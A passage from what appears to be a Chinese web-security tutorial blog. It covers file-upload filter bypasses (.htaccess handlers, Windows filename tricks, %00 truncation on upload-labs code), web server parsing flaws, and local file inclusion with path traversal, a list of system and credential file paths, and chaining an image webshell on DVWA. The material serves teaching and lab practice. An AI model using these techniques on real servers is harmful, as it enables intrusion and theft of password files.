src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205939084.png" alt="image-20230724205939084"><br><a name="eCh0E"></a></p><h4 id="3-4-5-htaccess绕过"><a href="#3-4-5-htaccess绕过" class="headerlink" title="3.4.5 .htaccess绕过"></a>3.4.5 .htaccess绕过</h4><ul><li>在apache里，这个文件作为一个配置文件，可以用来控制所在目录的访问权限以及解析设置。即是，可以通过设置可以将该目录下的所有文件作为php文件来解析</li><li>.htaccess可以写入apache配置信息，改变当前目录以及子目录的Apache配置信息。</li><li><strong>前提条件：</strong> 配置上允许.htaccess生效<br />Apache开启rewrite模块<br />.apache配置文件为AllowOverride All(默认为None)</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205950708.png" alt="image-20230724205950708"></p><ul><li><p><strong>方法一：</strong> 所有jpg后祭都会背当做PHP解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- AddType application/x-httpd-php.jpg </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724210005433.png" alt="image-20230724210005433"></p></li><li><p><strong>方法二：</strong> 带有jpg关键字会被当岗PHP解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;sec.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="lfB4y"></a></p></li></ul><h4 id="3-4-6-利用操作系统特性-windos"><a href="#3-4-6-利用操作系统特性-windos" class="headerlink" title="3.4.6 利用操作系统特性-windos"></a>3.4.6 利用操作系统特性-windos</h4><ul><li>利用window对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范,在最后生成文件时，字符会被自动去除。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724210022607.png" alt="image-20230724210022607"></p><ul><li><p><strong>源码分析：</strong></p></li><li><p><strong>第一种：</strong> 对应upland第6题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;       </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);         </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];       </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点      </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);        </span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写      </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA                  </span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;            </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];      </span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;             <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;            </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;                 <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;             &#125;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;         &#125;     &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>这题没有对后缀名进行去空，因此可以在后缀名加空格绕过</strong></p></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724210124625.png" alt="image-20230724210124625"><br><a name="rnmZs"></a></p><h4 id="3-4-7-00截断"><a href="#3-4-7-00截断" class="headerlink" title="3.4.7 %00截断"></a>3.4.7 %00截断</h4><ul><li><p>%00是chr(O)，它不是空格，是NULL，空字符。</p></li><li><p>当程序在输出含有chr(O)变量时，chr(O)后面的数据会被停止，换句话说，就是误把它当做结束符，后面的数据直接忽略，这就导致漏洞产生的原因。</p></li><li><p>在文件上传中，利用%00截断，在文件扩展名验证时，是取文件的扩展名来做验证，但是最后文件保存在本地时，%00会截断文件名，只保存%00之前的内容。</p></li><li><p><strong>前提条件：</strong> PHP版本 &lt; 5.34 、php的magic_quotes_gpc为OFF状态</p></li><li><p><strong>源码分析：</strong></p></li><li><p><strong>第一种：</strong> 对应upland第11题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;    </span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;       </span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];      </span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;         <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;       </span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;         &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;         &#125;     &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;         <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>第二种：</strong> 对应upland第19题</p></li><li><p><strong>前提条件：</strong> PHP版本 &lt; 5.34 、php的magic_quotes_gpc为OFF状态</p></li><li><p><strong>源码分析：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;       </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);         </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];       </span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);         </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;            </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];        </span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;         </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;              </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;                 <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;             &#125;         &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;             <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;         &#125;     &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同上<br><a name="fkYcq"></a></p></li></ul><h3 id="3-5-服务器解析漏洞"><a href="#3-5-服务器解析漏洞" class="headerlink" title="3.5 服务器解析漏洞"></a>3.5 服务器解析漏洞</h3><ul><li>解析漏洞,是指中间件(Apache、nginx、iis等)在解析文件时出现了漏洞,从而,黑客可以利用该漏洞实现非法文件的解析。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724210300296.png" alt="image-20230724210300296"><br><a name="LLfsb"></a></p><h4 id="3-5-1-Apache-解析漏洞"><a href="#3-5-1-Apache-解析漏洞" class="headerlink" title="3.5.1 Apache 解析漏洞"></a>3.5.1 Apache 解析漏洞</h4><ul><li>Apache解析文件规则是从右到左。例如shel.php.gix.ccc，apache会先识别ccc，ccc不被识别，则识别gix，以此类推，最后会被识别为php来运行。</li><li><a href="https://blog.csdn.net/wn314/article/details/77074477?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143812416780265498323%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162143812416780265498323&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-77074477.first_rank_v2_pc_rank_v29&utm_term=apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">Apache 解析漏洞</a><br><a name="uBUXT"></a></li></ul><h4 id="3-5-2-IIS6-0-漏洞"><a href="#3-5-2-IIS6-0-漏洞" class="headerlink" title="3.5.2 IIS6.0 漏洞"></a>3.5.2 IIS6.0 漏洞</h4><ul><li><strong>目录解析 :</strong></li><li>目录名为.asp、.asa、.cer，则目录下的所有文件都会被作为ASP</li><li>url&#x2F;test.asp&#x2F;shell.jpg会被当作asp脚本运行。</li><li><strong>文件解析 ：</strong></li><li>文件名中分号后不被解析，例如.asp;、.asa;、.cer;。</li><li>url&#x2F;test.asp;shell.jpg会被当作asp脚本运行。</li><li><strong>文件类型解析 ：</strong></li><li>.asa，.cer，.cdx都会被作为asp文件执行。</li><li>url&#x2F;shell.asa会被作为asp文件执行。</li><li><a href="https://blog.csdn.net/qq_39353923/article/details/83515616?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143782616780357287697%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162143782616780357287697&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-83515616.first_rank_v2_pc_rank_v29&utm_term=iis6.0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">IIS 6.0 解析漏洞</a><br><a name="DQ5uX"></a></li></ul><h4 id="3-5-3-Nginx-漏洞"><a href="#3-5-3-Nginx-漏洞" class="headerlink" title="3.5.3 Nginx 漏洞"></a>3.5.3 Nginx 漏洞</h4><ul><li>PHP+nginx默认是以cgi的方式去运行，当用户配置不当，会导致任意文件被当作php去解析。</li><li><strong>利用条件:</strong><br />以FastCGl运行<br />cgi.fix_pathinfo&#x3D;1(全版本PHP默认为开启)</li><li>例如如果满足上述条件，当你访问url&#x2F;shell.jpg&#x2F;shell.php时，shell.jpg会被当作php去执行。</li><li><a href="https://blog.csdn.net/m0_51803069/article/details/109330765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162143795416780271576906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162143795416780271576906&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109330765.first_rank_v2_pc_rank_v29&utm_term=Nginx%20%E6%BC%8F%E6%B4%9E">Nginx 解析漏洞</a><br><a name="TgTbn"></a></li></ul><h4 id="3-5-4-Nginx-文件名逻辑漏洞（CVE-2013-4547）了解"><a href="#3-5-4-Nginx-文件名逻辑漏洞（CVE-2013-4547）了解" class="headerlink" title="3.5.4 Nginx 文件名逻辑漏洞（CVE-2013-4547）了解"></a>3.5.4 Nginx 文件名逻辑漏洞（CVE-2013-4547）了解</h4><ul><li>影响版本:Nginx 0.8.41 ~ 1.4.3&#x2F;1.5.0 ~ 1.5.7</li><li>利用过程:<br />上传一个shell.jpg文件，注意最后为空格<br />访问url&#x2F;shell.jpg[Ox20][Ox00].php<br />(两个中括号中的数字是用Burp在Hex界面中更改)</li><li><a href="https://www.cnblogs.com/yuzly/p/11221564.html">漏洞复现参考链接</a><br><a name="FIjeA"></a></li></ul><h2 id="四、文件上传漏洞防御"><a href="#四、文件上传漏洞防御" class="headerlink" title="四、文件上传漏洞防御"></a>四、文件上传漏洞防御</h2><ul><li>服务端文件扩展名使用白名单检测+文件名重命名</li><li>对文件内容进行检测</li><li>对中间件做安全的配置</li><li>…</li></ul>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2023/07/20/wen-jian-bao-han/"/>
      <url>/2023/07/20/wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<p><a name="AQGr3"></a></p><h2 id="一、什么是文件包含漏洞？"><a href="#一、什么是文件包含漏洞？" class="headerlink" title="一、什么是文件包含漏洞？"></a>一、什么是文件包含漏洞？</h2><p><a name="xa8iP"></a></p><h3 id="1、文件包含概述"><a href="#1、文件包含概述" class="headerlink" title="1、文件包含概述"></a>1、文件包含概述</h3><p>和<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。<br />什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。<br />有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。<br />以PHP为例，常用的文件包含函数有以下四种：<br />include()，require()，include_once()，require_once()<br />区别如下：</p><ul><li>require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。</li><li>include()，找不到被包含的文件时只会产生警告，脚本将继续运行。</li><li>include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li><li>require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br><a name="AwEjw"></a></li></ul><h3 id="2、漏洞成因分析"><a href="#2、漏洞成因分析" class="headerlink" title="2、漏洞成因分析"></a>2、漏洞成因分析</h3><p>我们先直接来看一个简单的例子，网页代码如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180431388.png" alt="image-20230724180431388"></p><p>再创建一个phpinfo.php页面，代码如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180453144.png" alt="image-20230724180453144"><br />利用文件包含，我们通过include函数来执行phpinfo.php页面，成功解析：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180512133.png" alt="image-20230724180512133"><br />将phpinfo.php文件后缀改为txt后进行访问，依然可以解析：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180541499.png" alt="image-20230724180541499"><br />修改为jpg格式，也可以解析：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180559247.png" alt="image-20230724180559247"><br />可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。<br />在上一期文件上传漏洞的总结中，我们上传了一个jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当作php文件进行解析，现在知道是为什么了吧~<br />我们将phpinfo.jpg的内容改成一段文字：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180614571.png" alt="image-20230724180614571"><br />再次进行访问，可以读出文本内容：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180630963.png" alt="image-20230724180630963"><br />利用这个特性，我们可以读取一些包含敏感信息的文件。<br><a name="gSAP1"></a></p><h2 id="二、本地文件包含漏洞"><a href="#二、本地文件包含漏洞" class="headerlink" title="二、本地文件包含漏洞"></a>二、本地文件包含漏洞</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。<br />测试网页包含如下代码：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180646794.png" alt="image-20230724180646794"><br />网站利用文件包含功能读取一些php文件，例如phpinfo：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180707720.png" alt="image-20230724180707720"><br />利用该代码，我们可以读取一些系统本地的敏感信息。<br />例如C:\Windows\system.ini文件。<br><a name="frJmA"></a></p><h3 id="（1）使用绝对路径"><a href="#（1）使用绝对路径" class="headerlink" title="（1）使用绝对路径"></a>（1）使用绝对路径</h3><p>使用绝对路径直接进行读取：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180723327.png" alt="image-20230724180723327"><br><a name="jvjTe"></a></p><h3 id="（2）使用相对路径进行读取："><a href="#（2）使用相对路径进行读取：" class="headerlink" title="（2）使用相对路径进行读取："></a>（2）使用相对路径进行读取：</h3><p>当前页面所在路径为C:\Apache24\htdocs\，我们需要使用…&#x2F;退到C盘再进行访问，构造路径如下：<br />…&#x2F;…&#x2F;windows&#x2F;system.ini<br />成功读取到文件信息：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180738950.png" alt="image-20230724180738950"><br />.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置，在linux中同样适用。<br><a name="gcXjW"></a></p><h3 id="（3）一些常见的敏感信息路径："><a href="#（3）一些常见的敏感信息路径：" class="headerlink" title="（3）一些常见的敏感信息路径："></a>（3）一些常见的敏感信息路径：</h3><p>Windows系统：</p><ul><li>c:\boot.ini &#x2F;&#x2F; 查看系统版本</li><li>c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</li><li>c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</li><li>c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</li><li>c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</li><li>c:\windows\php.ini &#x2F;&#x2F; php 配置信息</li></ul><p>Linux&#x2F;Unix系统：</p><ul><li>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</li><li>&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</li><li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</li><li>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件<br><a name="CBll0"></a></li></ul><h2 id="三、LFI漏洞利用技巧"><a href="#三、LFI漏洞利用技巧" class="headerlink" title="三、LFI漏洞利用技巧"></a>三、LFI漏洞利用技巧</h2><p><a name="OjXZp"></a></p><h3 id="1、字符串截断"><a href="#1、字符串截断" class="headerlink" title="1、字符串截断"></a>1、字符串截断</h3><p>首先我们来看一段改进后的代码：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180757546.png" alt="image-20230724180757546"><br />我们去读取根目录下的site目录中的phpinfo.php文件：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180811302.png" alt="image-20230724180811302"><br />此时如果我们想通过文件包含漏洞读取本地敏感信息，就会遇到一些问题。因为服务器会给路径加上.&#x2F;site&#x2F;路径，以及.php后缀。<br />此时我们可以使用使用%00截断：<br />%00为结束符，在filename后带上%00，就可以截断末尾的.php。<br />当前路径为.&#x2F;site&#x2F;，如果要读取system.ini，则需要输入：…&#x2F;…&#x2F;…&#x2F;windows&#x2F;system.ini%00，成功读取如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180826762.png" alt="image-20230724180826762"><br />需要注意的是，%00截断需要php版本小于5.3.4，且关闭magic_quotes_gpc功能。<br><a name="TRW0m"></a></p><h3 id="2、配合文件上传使用"><a href="#2、配合文件上传使用" class="headerlink" title="2、配合文件上传使用"></a>2、配合文件上传使用</h3><p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。<br />以DVWA平台为例，编辑一个图片马，内容如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180848416.png" alt="image-20230724180848416"><br />找到上传点进行上传：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180901036.png" alt="image-20230724180901036"><br />文件保存的完整路径为：<br />C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br />DVWA平台low等级文件包含漏洞页面如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180923837.png" alt="image-20230724180923837"><br />该页面用于读取C:\phpStudy\WWW\vulnerabilities\fi\路径中的文件，代码如下：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180936296.png" alt="image-20230724180936296"><br />现在我们利用该页面去执行我们上传的图片马，路径需要从C:\phpStudy\WWW\vulnerabilities\fi\ 转到C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br />构造URL如下，页面无报错：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724180959134.png" 